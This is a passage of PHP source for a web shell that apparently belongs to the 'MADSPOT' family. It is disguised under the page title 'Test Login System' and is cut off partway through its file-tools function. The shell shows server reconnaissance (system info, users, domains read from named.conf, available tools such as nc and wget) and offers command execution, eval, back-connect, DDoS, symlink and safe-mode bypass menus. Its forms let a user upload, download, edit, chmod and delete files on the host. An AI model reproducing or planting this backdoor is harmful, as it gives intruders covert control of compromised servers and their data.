<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Test Login System</title>
<style type="text/css">
<!--
.whole {
	background-color: #CCC;
	height:auto;
	width: auto;
	margin-top: 10px;
	margin-right: 10px;
	margin-left: 10px;
}
.header {
	height: auto;
	width: auto;
	border: 7px solid #CCC;
	color: #999;
	font-size: 12px;
	font-family: Verdana, Geneva, sans-serif;
	background-color: #000;
}
.header a {color:#0F0; text-decoration:none;}
span {
	font-weight: bolder;
	color: #FFF;
}
#meunlist {
	font-family: Verdana, Geneva, sans-serif;
	color: #FFF;
	background-color: #000;
	width: auto;
	border-right-width: 7px;
	border-left-width: 7px;
	border-top-style: solid;
	border-right-style: solid;
	border-bottom-style: solid;
	border-left-style: solid;
	border-top-color: #CCC;
	border-right-color: #CCC;
	border-bottom-color: #CCC;
	border-left-color: #CCC;
	height: auto;
	font-size: 12px;
	font-weight: bold;
	border-top-width: 0px;
}
  .whole #meunlist ul {
	padding-top: 5px;
	padding-right: 5px;
	padding-bottom: 7px;
	padding-left: 2px;
	text-align:center;
	list-style-type: none;
	margin: 0px;
}
  .whole #meunlist li {
	margin: 0px;
	padding: 0px;
	display: inline;
}
  .whole #meunlist a {
    font-family: arial, sans-serif;
	font-size: 14px;
	text-decoration:none;
	font-weight: bold;
	color: #fff;
	clear: both;
	width: 100px;
	margin-right: -6px;
	padding-top: 3px;
	padding-right: 15px;
	padding-bottom: 3px;
	padding-left: 15px;
	border-right-width: 1px;
	border-right-style: solid;
	border-right-color: #FFF;
}
  .whole #meunlist a:hover {
	color: #000;
	background: #fff;
}

.foot {
	font-family: Verdana, Geneva, sans-serif;
	background-color: #000;
	margin: 0px;
	padding: 0px;
	width: 100%;
	text-align: center;
	font-size: 12px;
	color: #CCC;
	border-right-width: 7px;
	border-left-width: 7px;
    border-bottom-width: 7px;
    border-bottom-style: solid;
    border-right-style: solid;
    border-right-style: solid;
	border-left-style: solid;
	border-top-color: #CCC;
	border-right-color: #CCC;
	border-bottom-color: #CCC;
	border-left-color: #CCC;
}';
if(is_writable($GLOBALS['cwd']))
 {
    echo ".foottable {
    width: 300px;
    font-weight: bold;
    }";}
    else
    {
       echo ".foottable {
    width: 300px;
    font-weight: bold;
    background-color:red;
    }
    .dir {
      background-color:red;  
    }
    "; 
    }    
 echo '.main th{text-align:left;}
 .main a{color: #FFF;}
 .main tr:hover{background-color:red;}
 .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
 .bigarea{ width:99%; height:300px; }   
  </style>

';

echo "<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}</script>";

    
	echo '
</head>

<body bgcolor="#000000"  leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<div class="whole">
<form method=post name=mf style="display:none;">
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>
  <div class="header"><table width="100%" border="0"  align="lift">
  <tr>
    <td width="3%"><span>Uname:</span></td>
    <td colspan="2">'.substr(@php_uname(), 0, 120).'</td>
    </tr>
  <tr>
    <td><span>User:</span></td>
    <td>'. $uid . ' [ ' . $user . ' ] <span>   Group: </span>' . $gid . ' [ ' . $group . ' ] </td>
    <td width="14%" rowspan="8"><img alt="" src="data:image/jpeg;base64,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" /></td>
  </tr>
  <tr>
    <td><span>PHP:</span></td>
    <td>'.@phpversion(). '   <span>   Safe Mode:'.$safe_modes.'</span></td>
    </tr>
  <tr>
    <td><span>Our IP:</span></td>
    <td>'.@$_SERVER["SERVER_ADDR"].'    <span>Server IP:</span> '.@$_SERVER["REMOTE_ADDR"].'</td>
  </tr>
  <tr>
    <td><span>WEBS:</span></td>
    <td width="76%">';
    
    if($GLOBALS['sys']=='unix')
    {
        $d0mains = @file("/etc/named.conf");
        if(!$d0mains)
        {
            echo "CANT READ named.conf";
        }
        else
        {
          $count;  
         foreach($d0mains as $d0main)
         {
          if(@ereg("zone",$d0main))
          {
          preg_match_all('#zone "(.*)"#', $d0main, $domains);
           flush();
          if(strlen(trim($domains[1][0])) > 2){
         flush();
         $count++;
           } 
           }
           }
           echo "$count  Domains";
        }
    }
    else{ echo"CANT READ |Windows|";}
    
      echo '</td>
    </tr>
    <tr>
    <td height="16"><span>HDD:</span></td>
    <td>'.madSize($totalSpace).' <span>Free:</span>' . madSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</td>
    </tr>';
  
     if($GLOBALS['sys']=='unix' )
{
    if(!@ini_get('safe_mode'))
    {
    
    echo '<tr><td height="18" colspan="2"><span>Useful : </span>';
    $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
     foreach($userful as $item)
         if(madWhich($item))
         echo $item.',';
         echo '</td>
         </tr>
          <tr>
          <td height="0" colspan="2"><span>Downloader:</span>';
         
     $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
      foreach($downloaders as $item2)
       if(madWhich($item2))
        echo $item2.',';
        echo '</td>
              </tr>';
         
          }
           else 
           {
         echo '<tr><td height="18" colspan="2"><span>useful:</span>'; 
         echo '--------------</td>
           </tr><td height="0" colspan="2"><span>Downloader: </span>-------------</td>
              </tr>';  
         }
}
else
{
   echo '<tr><td height="18" colspan="2"><span>Window:</span>';
   echo madEx('ver');
   echo '</td>
         </tr> <tr>
        <td height="0" colspan="2"><span>Downloader: </span>-------------</td>
              </tr>'; 
    
}  
    
 
 echo '<tr>
    <td height="16" colspan="2"><span>Disabled functions:</span>'.$disfun.'</td>
  </tr>
  <tr>
    <td height="16" colspan="2"><span>cURL:'.$curl.'  MySQL:'.$mysql.'  MSSQL:'.$mssql.'  PostgreSQL:'.$pg.'  Oracle: </span>'.$or.'</td><td width="15%">'.base64_decode("PGEgaHJlZj0iaHR0cDovL3d3dy5tYWRzcG90Lm5ldCIgdGFyZ2V0PSJfYmxhbmsiPjxzcGFuPjxmb250IGNvbG9yPSIjMEYwIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDtNQURTUE9ULk5FVDwvZm9udD48L3NwYW4+PC9hPg==").'</td>
  </tr>
  <tr>
  <td height="11" colspan="3"><span>Open_basedir:'.$open_b.' Safe_mode_exec_dir:'.$safe_exe.'   Safe_mode_include_dir:'.$safe_include.'</td>
  </tr>
  <tr>
    <td height="11"><span>Server </span></td>
    <td colspan="2">'.@getenv('SERVER_SOFTWARE').'</td>
  </tr>';
  if($GLOBALS[sys]=="win")
  {
    echo '<tr>
    <td height="12"><span>DRIVE:</span></td>
    <td colspan="2">'.$drives.'</td>
     </tr>';
  }
  
  echo '<tr>
    <td height="12"><span>PWD:</span></td>
    <td colspan="2">'.$cwd_links.'  <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><font color=red >|CURRENT|</font></a></td>
  </tr>
  </table>
</div>
 <div id="meunlist">
      <ul>
<li><a href="#" onclick="g(\'FilesMan\',null,\'\',\'\',\'\')">HOME</a></li>

<li><a href="#" onclick="g(\'proc\',null,\'\',\'\',\'\')">PROCESS</a></li>
<li><a href="#" onclick="g(\'phpeval\',null,\'\',\'\',\'\')">EVAL</a></li>
<li><a href="#" onclick="g(\'sql\',null,\'\',\'\',\'\')">SQL</a></li>
<li><a href="#" onclick="g(\'hash\',null,\'\',\'\',\'\')">HASH</a></li>
<li><a href="#" onclick="g(\'connect\',null,\'\',\'\',\'\')">CONNECT</a></li>
<li><a href="#" onclick="g(\'zoneh\',null,\'\',\'\',\'\')">ZONE-H</a></li>
<li><a href="#" onclick="g(\'dos\',null,\'\',\'\',\'\')">DDOS</a></li>
<li><a href="#" onclick="g(\'safe\',null,\'\',\'\',\'\')">SAFE MODE</a></li>
<li><a href="#" onclick="g(\'symlink\',null,\'\',\'\',\'\')">SYMLINK</a></li>
<li><a href="#" onclick="g(\'spot\',null,\'\',\'\',\'\')">MADSPOT</a></li>
<li><a href="#" onclick="g(\'selfrm\',null,\'\',\'\',\'\')">KIll C0de</a></li>
</ul>
    
    </div>
';   
    
}

function madfooter()
{
    
    echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' >
       <tr>
         <td width='17%'><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>__MK FILE__</span><br><input class='dir'  type=text name=f value=''><input type=submit value='>>'></form></td>
         <td width='21%'><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>__MK DIR__</span><br><input class='dir' type=text name=d value=''><input type=submit value='>>'></form></td>
         <td width='22%'><form onsubmit=\"g('FilesMan',null,'delete',this.del.value);return false;\"><span>__DELETE__</span><br><input class='dir' type=text name=del value=''><input type=submit value='>>'></form></td>
         <td width='19%'><form onsubmit=\"g('FilesTools',null,this.f.value,'chmod');return false;\"><span>__CHMOD__</span><br><input class='dir' type=text name=f value=''><input type=submit value='>>'></form></td>
       </tr>
       <tr>
         <td colspan='2'><form onsubmit='g(null,this.c.value,\"\");return false;'><span>__CHANGE DIR__</span><br><input class='foottable' type=text name=c value='".htmlspecialchars($GLOBALS['cwd'])."'><input type=submit value='>>'></form></td>
         <td colspan='2'><form method='post' ><span>__HTTP DOWNLOAD__</span><br><input class='foottable' type=text name=rtdown value=''><input type=submit value='>>'></form></td>
        </tr>
       <tr>
         <td colspan='4'><form onsubmit=\"g('proc',null,this.c.value);return false;\"><span>__EXECUTE__</span><br><input class='foottable' type=text name=c value=''><input type=submit value='>>'></form></td>
        </tr>
       <tr>
         <td colspan='4'><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
        <span>Upload file:</span><br><input class='toolsInp' type=file name=f><br /><input type=submit value='>>'></form>
<form action='' method='post'>
<span>__LOGOUT__</span><br><input type='submit' name='delete' value='logout'>
</form>
</td>
        </tr> 
      </table>
  </div>
  </body>
</html>
";
    
}
if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
   function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) {
  function posix_getgrgid($p) {return false;} }

function madWhich($p) {
	$path = madEx('which ' . $p);
	if(!empty($path))
		return $path;
	return false;
}



function madSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}


function madPerms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function madPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000>' . madPerms(@fileperms($f)) . '</font>';
	elseif (!@is_writable($f))
		return '<font color=white>' . madPerms(@fileperms($f)) . '</font>';
	else
		return '<font color=#25ff00>' . madPerms(@fileperms($f)) . '</font>';
}

if(!function_exists("scandir")) {
	function scandir($dir) {
		$dh  = opendir($dir);
		while (false !== ($filename = readdir($dh)))
    		$files[] = $filename;
		return $files;
	}
}


function madFilesMan() {
	madhead();
    echo '<div class=header><script>p1_=p2_=p3_="";</script>';
	if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
					echo "Can't upload file!";
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2']))
					echo "Can't create new dir";
				break;
			case 'delete':
				function deleteDir($path) {
					$path = (substr($path,-1)=='/') ? $path:$path.'/';
					$dh  = opendir($path);
					while ( ($item = readdir($dh) ) !== false) {
						$item = $path.$item;
						if ( (basename($item) == "..") || (basename($item) == ".") )
							continue;
						$type = filetype($item);
						if ($type == "dir")
							deleteDir($item);
						else
							@unlink($item);
					}
					closedir($dh);
					@rmdir($path);
				}
				if(is_dir(@$_POST['p2']))
				deleteDir(@$_POST['p2']);
				else
				@unlink(@$_POST['p2']);
				break;
		default:
                if(!empty($_POST['p1'])) {
					$_SESSION['act'] = @$_POST['p1'];
					$_SESSION['f'] = @$_POST['f'];
					foreach($_SESSION['f'] as $k => $f)
						$_SESSION['f'][$k] = urldecode($f);
					$_SESSION['c'] = @$_POST['c'];
				}
				break;
		}
	}
	$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo '<h3><span>|  Access Denied! |</span></h3></div>';madFooter(); return; }
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
echo "
<table width='100%' class='main' cellspacing='0' cellpadding='2'  >
<form name=files method=post><tr><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' => $dirContent[$i],
					 'path' => $GLOBALS['cwd'].$dirContent[$i],
					 'modify' => @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
					 'perms' => madPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
					 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
			$files[] = array_merge($tmp, array('type' => 'file'));
		elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
		elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&& ($dirContent[$i] != "."))
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function wsoCmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "wsoCmp");
	usort($dirs, "wsoCmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" title=' . $f['link'] . '><b>| ' . htmlspecialchars($f['name']) . ' |</b>').'</a></td><td>'.(($f['type']=='file')?madSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
			.'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'<a href="#" onclick="g(\'FilesMan\',null,\'delete\', \''.urlencode($f['name']).'\')"> X </a></td></tr>';
		$l = $l?0:1;
	}
	echo "<tr><td colspan=7>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
	<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
	</form></table></div>";

	
    madfooter();
 }
    
  function madFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: " . $type);
			} else
                header("Content-Type: application/octet-stream");
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		}exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	
   madhead();
	echo '<div class=header>';
	if( !file_exists(@$_POST['p1']) ) {
		echo "<pre class=ml1 style='margin-top:5px'>FILE DOEST NOT EXITS </pre></div>";
		madFooter();
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?madSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.madPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Edit', 'Chmod', 'Rename', 'Touch');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '<a  href=# onclick="g(null,null,null,\''.strtolower($v).'\')"><span>'.((strtolower($v)==@$_POST['p2'])?'<b><span> '.$v.' </span> </b>':$v).' </span></a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre>';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
				$code = @highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
			}
			clearstatcache();
